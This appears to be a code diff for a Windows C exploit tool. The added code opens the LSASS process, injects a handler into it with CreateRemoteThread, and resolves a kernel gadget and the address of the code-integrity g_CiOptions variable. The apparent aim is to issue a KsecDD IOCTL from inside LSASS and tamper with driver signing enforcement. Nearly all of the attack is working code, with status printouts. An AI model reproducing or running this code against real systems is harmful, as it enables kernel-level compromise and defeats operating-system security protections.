@@ -16,15 +16,6 @@ BOOL WINAPI LsaKsec_SendIoctl()
 	pObjectBasicInformation = ((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(OBJECT_BASIC_INFORMATION));
 	pParameterStruct = (PIPC_SET_FUNCTION_RETURN_PARAMETER)((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(IPC_SET_FUNCTION_RETURN_PARAMETER));
 	
-	/*
-	//if (((rip * 2) != 0x1090909090909090) && ((parameter * 2) != 0x1111111111111111) && (pObjectBasicInformation > 0))
-	if ((InternalStruct.rip != (0x1090909090909090 * 2)) && (InternalStruct.parameter != (0x1111111111111111 * 2)) && (pObjectBasicInformation > 0))
-	{
-		pParameterStruct = (PIPC_SET_FUNCTION_RETURN_PARAMETER)((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(IPC_SET_FUNCTION_RETURN_PARAMETER));
-		//pIpcSetFunctionReturnParameter = (PIPC_SET_FUNCTION_RETURN_PARAM)((PLOCALALLOC)0x3131313131313131)(LPTR, (sizeof(UINT64) * 2));
-	}
-	*/
-	
 	if (pParameterStruct > 0)
 	{
 		pParameterStruct->pInternalStruct = &InternalStruct;
@@ -99,126 +90,7 @@ BOOL WINAPI LsaKsec_SendIoctl_end()
 }
 #pragma optimize ("", on)
 
-WINDOWS_VERSION GetOsBuildNumber()
-{
-	NTSTATUS status = 0;
-	WINDOWS_VERSION iVersion = WINDOWS_UNSUPPORTED;
-	RTL_OSVERSIONINFOW RtlOSVersion = { 0 };
-	PRTLGETVERSION RtlGetVersion = 0;
-	HMODULE hModule = 0;
-
-	hModule = GetModuleHandle(L"ntdll.dll");
-	if (hModule)
-	{
-		RtlGetVersion = (PRTLGETVERSION)GetProcAddress(hModule, "RtlGetVersion");
-		if (RtlGetVersion)
-		{
-			RtlOSVersion.dwOSVersionInfoSize = sizeof(RtlOSVersion);
-			status = RtlGetVersion(&RtlOSVersion);
-
-			if ((status == STATUS_SUCCESS) && (RtlOSVersion.dwMajorVersion == 10))
-			{
-				switch (RtlOSVersion.dwBuildNumber)
-				{
-				case 14393:
-					iVersion = WINDOWS_REDSTONE_1;
-					break;
-
-				case 15063:
-					iVersion = WINDOWS_REDSTONE_2;
-					break;
-
-				case 16299:
-					iVersion = WINDOWS_REDSTONE_3;
-					break;
-
-				case 17134:
-					iVersion = WINDOWS_REDSTONE_4;
-					break;
-
-				case 17763:
-					iVersion = WINDOWS_REDSTONE_5;
-					break;
-
-				case 18362:
-					iVersion = WINDOWS_19H1;
-					break;
-
-				case 18363:
-					iVersion = WINDOWS_19H2;
-					break;
-
-				case 19041:
-					iVersion = WINDOWS_20H1;
-					break;
-
-				case 19042:
-					iVersion = WINDOWS_20H2;
-					break;
-
-				case 19043:
-					iVersion = WINDOWS_21H1;
-					break;
-
-				case 19044:
-					iVersion = WINDOWS_21H2;
-					break;
-
-				case 19045:
-					iVersion = WINDOWS_22H2;
-					break;
-
-				default:
-					iVersion = WINDOWS_UNSUPPORTED;
-					break;
-				}
-			}
-
-			SecureZeroMemory(&RtlOSVersion, sizeof(RTL_OSVERSIONINFOW));
-		}
-	}
-
-	return iVersion;
-
-}
-
-LPVOID GetDriverBaseAddress(LPSTR DeviceDriverName)
-{
-	LPVOID tmp_array = 0;
-	LPVOID result = 0;
-	DWORD needed = 0, needed2 = 0;
-	DWORD64 i = 0;
-	char name[MAX_PATH];
-	int j = 0;
-
-	EnumDeviceDrivers(tmp_array, 0, &needed);
-	if (needed > 0)
-	{
-		tmp_array = (LPVOID)LocalAlloc(LPTR, (SIZE_T)needed);
-		if (tmp_array)
-		{
-			if (EnumDeviceDrivers(tmp_array, needed, &needed2))
-			{
-				for (i = 0; i < needed / sizeof(LPVOID); i++)
-				{
-					GetDeviceDriverBaseNameA(*(PVOID*)(PVOID*)((PBYTE)tmp_array + (8 * i)), name, MAX_PATH);
-					if (_stricmp(name, DeviceDriverName) == 0)
-					{
-						RtlCopyMemory(&result, (PBYTE)tmp_array + (8 * i), sizeof(LPVOID));
-						break;						
-					}
-				}
-			}
-			//SecureZeroMemory(&tmp_array, (SIZE_T)needed);
-			LocalFree(tmp_array);
-		}
-	}
-
-	return result;
-
-}
-
-int main(int argc, char* argv[])
+int main()
 {
 	REPLACEABLE_POINTER ReplPointers[] = {
 		{ L"kernel32.dll", "DeviceIoControl", (PVOID)0x4343434343434343, NULL},
@@ -235,16 +107,24 @@ int main(int argc, char* argv[])
 	SIZE_T szRemoteHandler = (SIZE_T)((PBYTE)LsaKsec_SendIoctl_end - (PBYTE)LsaKsec_SendIoctl);
 	UINT64 ntoskrnl_gadget = 0;
 	UINT64 ci_g_cioptions = 0;
-	DWORD FakePtrsCount = sizeof(ReplPointers) / sizeof(REPLACEABLE_POINTER), i = 0;
+	DWORD FakePtrsCount = sizeof(ReplPointers) / sizeof(REPLACEABLE_POINTER), i = 0, lsa = 0;
 	HANDLE hProcess = 0, hThread = 0;
 	
 	windows_version = GetOsBuildNumber();
-	if (windows_version == WINDOWS_UNSUPPORTED) // correct
+	lsa = GetLsaProcessId();
+	if ((NTOSKRNL_GADGET_OFFSET[windows_version] == 0x00) || (CI_G_CI_OPTIONS_OFFSET[windows_version] == 0x00))
 	{
+		PRINT_ERROR(L"OS is not supported.\n");
 		return 0;
 	}
 	else if (!EnablePrivilege(L"SeDebugPrivilege"))
 	{
+		PRINT_ERROR(L"SeDebugPrivilege - %08x\n", GetLastError());
+		return 0;
+	}
+	else if (!lsa)
+	{
+		PRINT_ERROR(L"LSASS process ID not found.\n");
 		return 0;
 	}
 
@@ -253,6 +133,8 @@ int main(int argc, char* argv[])
 	
 	if ((ntoskrnl_gadget > NTOSKRNL_GADGET_OFFSET[windows_version]) && (ci_g_cioptions > CI_G_CI_OPTIONS_OFFSET[windows_version]))
 	{
+		PRINT_SUCCESS(L"ntoskrnl gadget\t: 0x%-016p\n", (PVOID)ntoskrnl_gadget);
+		PRINT_SUCCESS(L"g_cioptions\t: 0x%-016p\n", (PVOID)ci_g_cioptions);
 		for (i = 0; i < FakePtrsCount; i++)
 		{
 			if (ReplPointers[i].FakePtr == (PVOID)0x2121212121212121)
@@ -260,99 +142,46 @@ int main(int argc, char* argv[])
 			if (ReplPointers[i].FakePtr == (PVOID)0x2222222222222222)
 				ReplPointers[i].RealPtr = (PVOID)ci_g_cioptions;
 		}
-	}
-
-	hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, atoi(argv[1]));
-	if (hProcess != INVALID_HANDLE_VALUE)
-	{
-		LocalHandler = (LPVOID)LocalAlloc(LPTR, szRemoteHandler);
-		if (LocalHandler)
-		{
-			RtlCopyMemory(LocalHandler, LsaKsec_SendIoctl, szRemoteHandler);
-			RemoteHandler = ReplaceFakePointers(hProcess, LocalHandler, (DWORD)szRemoteHandler, (PREPLACEABLE_POINTER)&ReplPointers, FakePtrsCount);
-			if (RemoteHandler != NULL)
-			{
-				hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteHandler, NULL, 0, NULL);
-				if ((hThread != INVALID_HANDLE_VALUE) && (hThread != 0))
-				{
-					WaitForSingleObject(hThread, INFINITE);
-					CloseHandle(hThread);
-				}
-
-				VirtualFreeEx(hProcess, RemoteHandler, 0, MEM_RELEASE);
-			}
-			
-			LocalFree(LocalHandler);
-		}
 		
-		CloseHandle(hProcess);
+		hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, lsa);
+		if ((hProcess != INVALID_HANDLE_VALUE) && (hProcess != 0))
+		{
+			PRINT_SUCCESS(L"lsass pid %d successfully opened.\n", lsa);
+			LocalHandler = (LPVOID)LocalAlloc(LPTR, szRemoteHandler);
+			if (LocalHandler)
+			{
+				RtlCopyMemory(LocalHandler, LsaKsec_SendIoctl, szRemoteHandler);
+				RemoteHandler = ReplaceFakePointers(hProcess, LocalHandler, (DWORD)szRemoteHandler, (PREPLACEABLE_POINTER)&ReplPointers, FakePtrsCount);
+				if (RemoteHandler != NULL)
+				{
+					PRINT_SUCCESS(L"Remote handler successfully injected.\n");
+					hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteHandler, NULL, 0, NULL);
+					if ((hThread != INVALID_HANDLE_VALUE) && (hThread != 0))
+					{
+						PRINT_SUCCESS(L"Remote thread successfully created.\n");
+						WaitForSingleObject(hThread, INFINITE);
+						CloseHandle(hThread);
+					}
+					else
+						PRINT_ERROR(L"Remote thread failure.\n");
+
+					if (VirtualFreeEx(hProcess, RemoteHandler, 0, MEM_RELEASE))
+						PRINT_SUCCESS(L"Target process cleaning success.\n");
+					else
+						PRINT_ERROR(L"Attempted to clean target process.\n");
+				}
+				else
+					PRINT_ERROR(L"Handler injection error.\n");
+
+				LocalFree(LocalHandler);
+			}
+
+			CloseHandle(hProcess);
+		}
+		else
+			PRINT_ERROR(L"lsass - %08x\n", GetLastError());
 	}
 
 	return 0;
+
 }
-
-
-
-
-/*
-* 
-* 
-* PSYSTEM_HANDLE_INFORMATION pSystemHandleInformation = 0;
-	POBJECT_NAME_INFORMATION pObjectNameInformation = 0;
-	OBJECT_BASIC_INFORMATION objectBasicInformation = { 0 };
-	WINDOWS_VERSION windows_version = WINDOWS_UNSUPPORTED;
-	UINT64 ntoskrnl_gadget = 0;
-	UINT64 ci_g_cioptions = 0;
-	HMODULE ntdll = 0;
-	ULONG return_length = 0, szSystemInformationBuffer = sizeof(SYSTEM_HANDLE_INFORMATION), szObjectInformationBuffer = 0;
-	DWORD i = 0;
-
-while (NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x10, (PVOID)pSystemHandleInformation, szSystemInformationBuffer, NULL) != STATUS_SUCCESS)
-	{
-		if (pSystemHandleInformation)
-		{
-			LocalFree(pSystemHandleInformation);
-			szSystemInformationBuffer *= 2;
-		}
-
-		pSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)LocalAlloc(LPTR, (SIZE_T)szSystemInformationBuffer);
-		if (!pSystemHandleInformation)
-		{
-			break;
-		}
-
-	}
-
-
-	if (pSystemHandleInformation)
-	{
-		for (i = 0; i < pSystemHandleInformation->HandleCount; i++)
-		{
-			if (pSystemHandleInformation->Handles[i].ProcessId == (ULONG)GetCurrentProcessId())
-			{
-				if (NtQueryObject((HANDLE)pSystemHandleInformation->Handles[i].Handle, ObjectBasicInformation, &objectBasicInformation, sizeof(OBJECT_BASIC_INFORMATION), &szObjectInformationBuffer) == STATUS_SUCCESS)
-				{
-					if (!objectBasicInformation.NameInformationLength)
-						szObjectInformationBuffer = MAX_PATH * sizeof(WCHAR);
-					else
-						szObjectInformationBuffer = objectBasicInformation.NameInformationLength;
-
-					pObjectNameInformation = (POBJECT_NAME_INFORMATION)LocalAlloc(LPTR, szObjectInformationBuffer);
-					NtQueryObject((HANDLE)pSystemHandleInformation->Handles[i].Handle, 1, pObjectNameInformation, szObjectInformationBuffer, &szObjectInformationBuffer);
-					if (pObjectNameInformation->Name.Buffer != NULL)
-					{
-						printf("0x%-016p\t: %ws\n", (PVOID)pSystemHandleInformation->Handles[i].Handle, pObjectNameInformation->Name.Buffer);
-					}
-
-					SecureZeroMemory(&objectBasicInformation, sizeof(OBJECT_BASIC_INFORMATION));
-					LocalFree(pObjectNameInformation);
-				}
-			}
-		}
-
-		LocalFree(pSystemHandleInformation);
-
-	}
-
-
-*/
